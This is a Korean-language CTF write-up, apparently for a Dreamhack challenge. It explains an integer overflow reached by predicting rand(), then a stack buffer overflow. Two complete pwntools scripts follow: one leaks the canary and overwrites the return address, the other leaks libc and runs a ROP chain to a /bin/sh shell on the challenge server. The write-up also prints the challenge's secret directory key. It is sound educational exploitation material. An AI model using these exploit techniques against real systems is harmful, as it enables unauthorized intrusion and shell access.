## 배경

이 문제는 공격 대상의 OS, 버전을 알지 못한 채로 공격하는 상황을 아이디어로 두고 만든 문제입니다. 일반적인 경우 풀이자의 편의를 위해 Dockerfile이 제공되지만, 이 문제에서는 제공하고 있지 않고, 바이너리를 제공하지 않으므로 서버의 OS와 버전, 바이너리의 보호기법을 알지 못합니다. (OS의 경우 이 문제에서는 ubuntu를 사용하였지만 당연히 ubuntu라고 생각하신다면 큰 오산입니다. 예시로 [Dreamhack wiki](https://dreamhack.io/guide/wargame/using-git#%EB%AC%B8%EC%A0%9C-%ED%8C%8C%EC%9D%BC-%EA%B5%AC%EC%84%B1%ED%95%98%EA%B8%B0)에서는 slim 혹은 alpine을 권장하고 있습니다.) 또한 Dockerfile을 얻지 않으면 flag를 찾을 수 없도록 해놓았기에 반드시 찾아야 합니다.

## 프로그램 분석

바이너리 대신 prob.c를 제공하고 있으므로 먼저 이를 분석하겠습니다.
### directory_key

Dockerfile을 가지고 있는 폴더의 키를 출력해주는 함수입니다.

```c
void directory_key()
{
	puts("Directory key is {{REDACTED}}\n");
}
```
### operation

두 숫자가 같으면 곱하기 연산, a가 b보다 크면 더하기 연산을 수행합니다. 그 외에는 아무 연산도 수행하지 않습니다.

```c
void operation(int a, int b)
{
	if (a == b)
		num[type] *= num[1 - type];
	else if (a > b)
		num[type] += num[1 - type];
	else
		return;
}
```
### calculator

1. type을 0, 1로 바꿔가며 operation 함수를 12번 호출합니다.
2. num의 두 숫자들이 조건을 만족하면 이름을 입력받고 출력합니다.

```c
void calculator()
{
	char name[100];
	int input_num, rand_num, i;
	srand(time(NULL));
	for (i = 0; i < 12; i++)
	{
		type = 1 - type;
		if (num[0] < 0 && num[1] < 0)
		{
			printf("Name? ");
			read(0, name, 0x100);
			printf("%s, Hello\n", name);
		}
  
		printf("> ");
		scanf("%d", &input_num);
		rand_num = rand();
		operation(input_num, rand_num);
	}
}
```
## 취약점 설명

### Integer-Overflow

이항 연산을 12번 수행하기 때문에 rand함수로 도출되는 값을 맞춘다면 int형인 num 값들이 오버플로우될 수 있습니다. 그렇지만 12번만에 오버플로우를 시키기 쉽지 않아보입니다. 그렇기에 이 과정을 파이썬으로 직접 구현해서 어떻게 해야 오버플로우를 시킬 수 있을지를 직접 구합니다. 아래 코드는 int형 처리까지 한 코드입니다.

``` python
import sys
sys.setrecursionlimit(10**9)

l = 999999999

def dfs(cal : list, num : list, typ : int):
	global l
	if len(cal) > l : return
	if num[typ] < 0 and num[1 - typ] < 0:
		if len(cal) <= l :
			l = len(cal)
			print(cal, num)
		else :
			return

	cal.append('+')
	temp = num[typ]
	num[typ] = (num[typ] + num[1 - typ]) & (2 ** 32 - 1)
	if num[typ] >= (2 ** 31) : num[typ] = - (2 ** 32) + num[typ]
	dfs(cal, num, 1 - typ)
	num[typ] = temp
	cal.pop()
  
	cal.append('*')
	num[typ] = (num[typ] * num[1 - typ]) & (2 ** 32 - 1)
	if num[typ] >= (2 ** 31) : num[typ] = - (2 ** 32) + num[typ]
	dfs(cal, num, 1 - typ)
	num[typ] = temp
	cal.pop()
  
dfs([], [1, 1], 0)
```

```bash
...
['+', '+', '+', '*', '+', '*', '*', '*', '+', '*', '*'] [-1544732672, -490243072]
['+', '+', '+', '*', '+', '*', '*', '*', '*', '+'] [-2084901888, -2083101888]
['+', '+', '+', '*', '+', '*', '*', '*', '*', '*'] [-2084901888, -1234239488]
['+', '+', '+', '*', '*', '+', '*', '*', '*', '+'] [-194342296, -193734796]
['+', '+', '+', '*', '*', '*', '*', '+', '*', '+'] [-1375872092, -1375786592]
['+', '+', '+', '*', '*', '*', '*', '*', '*', '+'] [-1080803915, -985882040]
['+', '+', '+', '*', '*', '*', '*', '*', '*', '*'] [-1080803915, -234741009]
['+', '+', '*', '+', '*', '*', '*', '*', '*', '+'] [-276146592, -263392008]
['+', '+', '*', '*', '+', '*', '*', '*', '*', '+'] [-806617088, -802138112]
['+', '+', '*', '*', '*', '*', '+', '*', '*', '+'] [-404326016, -400336928]
['+', '+', '*', '*', '*', '*', '*', '*', '*', '+'] [-1974050816, -1565904128]
```

위의 결과에서 10번의 작업으로 오버플로우를 시킬 수 있음을 알 수 있습니다.
### Buffer-Overflow

num 배열에 있는 두 숫자가 모두 0보다 작으면, 이름을 입력받고 출력해주는데, 입력 글자 수를 제한하지 않기 때문에 버퍼 오버플로우가 발생합니다.

```c
void calculator()
{
	char name[100];
	...
	for (i = 0; i < 12; i++)
	{
		type = 1 - type;
		if (num[0] < 0 && num[1] < 0)
		{
			printf("Name? ");
			read(0, name, 0x100);
			printf("%s, Hello\n", name);
		}
		...
	}
}
```
## 익스플로잇 1 : secret 폴더 키 얻기

위에서의 논의와 합하면 2번의 버퍼 오버플로우를 발생시킬 수 있음을 알 수 있습니다. pie와 canary가 걸려있는지 아닌지는 모르기 때문에 memory leak을 해보면, 둘 다 걸려있는 것을 확인할 수 있습니다. 첫 번째 버퍼 오버플로우에서 canary 값을 구하고, 두 번째 버퍼 오버플로우에서 간단한 브루트포싱으로 RET 부분의 마지막 바이트 조작을 통해 directory_key 함수를 실행시킬 수 있도록 합니다. 아래는 익스 코드입니다.

```python
from pwn import *
from ctypes import *
  
buf_len = 0
l = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so.6')
  
def st():
	p = remote('host3.dreamhack.games', 8561)
  
	v0 = int(l.time(0) + 0)
	l.srand(v0)
	win_cal = ['+', '+', '*', '*', '*', '*', '+', '*', '*', '+']
	for i in range(0, 10) :
		num = int(l.rand())
		if win_cal[i] == '+':
			p.sendlineafter(b'> ', str(num + 1).encode())
		else :
			p.sendlineafter(b'> ', str(num).encode())
  
	return p
  
for i in range(100, 120):
	p = st()
	p.sendafter(b'Name? ', b'a' * i)
	res = p.recvline().split(b',')[0]
	p.close()
	if len(res) > i + 4 :
		buf_len = i
		print(f"buf_len = {buf_len}")
		break
  
for i in range(0, 256):
	try:
		p = st()
		p.sendafter(b'Name? ', b'a' * buf_len)
		res = p.recvline().split(b',')[0][buf_len:]
		canary = u64(b'\x00' + res[:7])
		print("canary = " + hex(canary))
		stack = u64(res[7:] + b'\x00' * 2)
		print("stack = " + hex(stack))
		p.sendline(str(int(l.rand() + 1)).encode())
  
		p.sendafter(b'Name? ', b'a' * (buf_len - 1) + p64(canary) + b'b' * 8 + int.to_bytes(i, 1, 'little'))
		p.sendlineafter(b'> ', b'1')
		res = p.recvline()
		print(res)
		p.close()
		break
	except:
		p.close()
```

이를 실행시키면 buf_len = 105에서 canary 값이 나옴을 알 수 있고, RET 부분의 마지막 바이트를 0x74로 변조했을 때 key가 출력됩니다.
(key = b6616a3e97c67addfc7d8d741a9f05c836c5ca161869a3d63f1f0006b5a2b19d)
이를 이용하여 secret.zip 압축을 해제하면 Dockerfile이 나옵니다. 여기서 얻어야 할 점은 flag가 `/usr/lib/x86_64-linux-gnu/liblibliblibliblibliblib`에 위치한다는 것입니다.
## 익스플로잇 2 : shell 획득

gdb를 통해 prob를 분석해보면,

![[Pasted image 20240823144258.png]]
RET의 마지막 바이트를 0xa5로 바꾸면 calculator가 다시 실행됨을 알 수 있습니다. 이를 통해 버퍼 오버플로우를 다시 발생시킬 수 있고, ROP를 통해 shell을 획득하면 됩니다. 두 번째 익스 코드입니다.

```python
from pwn import *
from ctypes import *
  
buf_len = 105
l = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # 주어진 libc을 사용
e = ELF('./prob')
  
def st():
	p = remote('host3.dreamhack.games', 22141)
  
	v0 = int(l.time(0) + 0)
	l.srand(v0)
	win_cal = ['+', '+', '*', '*', '*', '*', '+', '*', '*', '+']
	for i in range(0, 10):
		num = int(l.rand())
		if win_cal[i] == '+':
			p.sendlineafter(b'> ', str(num + 1).encode())
		else:
			p.sendlineafter(b'> ', str(num).encode())
  
	return p
  
p = st()
p.sendafter(b'Name? ', b'a' * buf_len)
res = p.recvline().split(b',')[0][buf_len:]
canary = u64(b'\x00' + res[:7])
print("canary = " + hex(canary))
stack = u64(res[7:] + b'\x00' * 2)
print("stack = " + hex(stack))
p.sendline(str(int(l.rand() + 1)).encode())
  
p.sendafter(b'Name? ', b'a' * (buf_len - 1) + p64(canary) + p64(stack) + int.to_bytes(0xa5, 1, 'little'))
p.sendlineafter(b'> ', b'1')
  
p.sendafter(b'Name? ', b'a' * (buf_len + 0x20 - 1))
res = p.recvline().split(b',')[0][(buf_len + 0x20 - 1):]
libc_base = u64(res + b'\x00' * 2) - (0x7ffff7db7d90 - 0x7ffff7d8e000) # gdb로 분석
print("libc_base = " + hex(libc_base))
p.sendlineafter(b'> ', b'1')
  
for _ in range(10):
	p.sendafter(b'Name? ', b'a')
	p.sendlineafter(b'> ', b'1')
  
ret = libc_base + 0x0000000000029139
pop_rdi = libc_base + 0x000000000002a3e5
system = libc_base + libc.symbols['system']
bin_sh = libc_base + list(libc.search(b"/bin/sh"))[0]
  
p.sendafter(b'Name? ', b'a' * (buf_len - 1) + p64(canary) + p64(stack) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system))
p.sendlineafter(b'> ', b'1')
  
p.interactive()

p.close()
```

## 주의할 점

- secret key를 얻을 때 두 바이트 브루트포싱을 해야 할 수도 있지 않냐는 생각이 들 수 있습니다. 물론 실제 상황에서는 그럴 수 있겠지만 한 바이트 브루트포싱을 의도로 하고 문제를 제작하였습니다.
- Integer Overflow를 실행시키기 위한 코드는 정해져 있지 않으며, 10번의 작동으로 취약점을 유발시킬 수 있음을 알아내기만 하면 됩니다.

## 레퍼런스

- [RELRO](https://dreamhack.io/lecture/courses/99)
- [카나리(Canary)](https://dreamhack.io/lecture/courses/112)
- [Non-Executable stack (NX)](https://dreamhack.io/lecture/courses/50)
- [Position Independent Executable (PIE)](https://dreamhack.io/lecture/courses/113)
- [Address Space Layout Randomization (ASLR)](https://dreamhack.io/lecture/courses/85)
- [스택 버퍼 오버플로우(Stack Buffer Overflow)](https://dreamhack.io/lecture/courses/60)
- [Integer-Overflow](https://learn.dreamhack.io/118#1)
- [ctypes](https://docs.python.org/ko/3/library/ctypes.html)